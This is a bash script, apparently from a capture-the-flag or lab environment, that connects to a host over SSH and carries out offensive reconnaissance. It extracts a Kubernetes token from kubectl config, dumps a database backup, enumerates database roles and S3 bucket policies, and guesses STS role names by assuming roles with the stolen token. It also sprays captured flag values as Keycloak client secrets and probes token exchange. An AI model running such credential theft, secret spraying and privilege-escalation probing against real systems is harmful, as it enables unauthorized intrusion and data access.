set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
export AWS_CA_BUNDLE=/home/rowan/.local/share/keplerops/ca.crt
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
echo "=== DUMP SQL TEXT ==="
pg_restore -f - /tmp/ch.dump 2>/dev/null | sed -n '1,400p'
echo "=== DB LIST ==="
psql service=fieldlink -c '\l' 2>&1 | head -30
echo "=== TABLES export/workspace/public ==="
psql service=fieldlink -Atc "select n.nspname||'.'||c.relname||':'||c.relkind from pg_class c join pg_namespace n on n.oid=c.relnamespace where n.nspname in ('export','workspace','public') and c.relkind in ('r','v','m','p','f') order by 1" 2>&1 | head -60
echo "=== FUNCS ==="
psql service=fieldlink -Atc "select n.nspname||'.'||p.proname from pg_proc p join pg_namespace n on n.oid=p.pronamespace where n.nspname in ('export','workspace','public','support') order by 1" 2>&1 | head -40
echo "=== ROLES ALL ==="
psql service=fieldlink -Atc "select rolname,rolcanlogin,rolsuper from pg_roles order by 1" 2>&1 | head -40
echo "=== S3 BUCKET POLICIES ==="
for b in fieldlink-exports fieldkest-workspaces; do
 echo "## $b policy"; aws --endpoint-url https://objects.keplerops.test s3api get-bucket-policy --bucket $b 2>&1 | head -c 1200; echo
 echo "## $b acl"; aws --endpoint-url https://objects.keplerops.test s3api get-bucket-acl --bucket $b 2>&1 | head -c 800; echo
 echo "## $b cors"; aws --endpoint-url https://objects.keplerops.test s3api get-bucket-cors --bucket $b 2>&1 | head -c 500; echo
 echo "## $b encryption"; aws --endpoint-url https://objects.keplerops.test s3api get-bucket-encryption --bucket $b 2>&1 | head -c 400; echo
done
echo "=== STS ROLE NAME ORACLE ==="
for r in rowan-workspace fieldlink-workload fieldkest-workload workload fieldlink support support-export support-export-reader export-reader fieldkest-export fieldlink-export fieldlink-data data export objects cloud-api rowan rowan.ito fieldlink-connector connector arwc arwc-export admin reader; do
 o=$(aws --endpoint-url https://objects.keplerops.test sts assume-role-with-web-identity --role-session-name probe --role-arn arn:aws:iam::000000000000:role/$r --web-identity-token "$JWT" 2>&1 | grep -oE 'role not found: [^ ]*|AccessDenied|An error occurred \([A-Za-z]+\)|Credentials|not authorized|audience' | head -1)
 echo "$r -> $o"
done
echo "=== KEYCLOAK BUILTIN CLIENTS WITH FLAG SECRETS ==="
I=https://identity.keplerops.test
for cl in admin-cli account account-console security-admin-console broker realm-management; do
 for s in "FLAG{6bb66074f2325405}" "FLAG{adfbabdcdaca98ac}"; do
  for r in keplerops master; do
   code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -d "grant_type=client_credentials&client_id=$cl&client_secret=$s" "$I/realms/$r/protocol/openid-connect/token")
   if [ "$code" != "401" ]; then echo "!! $r client=$cl secret=${s:6:6} -> $code :: $(head -c 200 /tmp/o)"; fi
  done
 done
done
echo "done kc"
echo "=== MASTER REALM CLIENT ENum ==="
for c in workspace fieldlink-workload support-export-reader fieldkest-workspace; do
 code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&client_id=$c" "$I/realms/master/protocol/openid-connect/token")
 echo "$c -> $code :: $(head -c 120 /tmp/o)"
done
RSH
echo DONE_K14_R23
